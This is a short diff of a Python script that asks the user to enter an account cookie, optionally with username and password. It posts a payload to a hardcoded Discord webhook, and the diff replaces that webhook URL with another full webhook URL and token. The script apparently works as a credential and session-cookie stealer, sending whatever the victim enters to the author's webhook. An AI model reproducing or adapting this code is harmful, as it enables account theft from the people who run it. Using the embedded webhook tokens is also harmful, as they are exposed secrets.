@@ -68,7 +68,7 @@ def main(cookie):
     headers = {"Content-Type": "Application/json"}
     response = requests.post(WEBHOOK, headers=headers, data=json.dumps(payload))
 
-WEBHOOK = "https://discord.com/api/webhooks/1221179389690253434/g6I--E55j9lLpe0fv5bBFwOEjvamxhTEGaMPbXkKFMRSx4eOBg6SMKcofUnpvw35ykeL"
+WEBHOOK = "https://discord.com/api/webhooks/1177317570806825061/N7I-iPAOHyToO5D2Q3BF3hR49vhugxrV8CdgU7zsHHmw2Tlcyx2t58_g9DQ2yQDXpHfo"
 credentials = input(Fore.RED + 'Enter the account cookie - ')
 if credentials.count(':') >= 2:
     username, password, cookie = credentials.split(':',2)
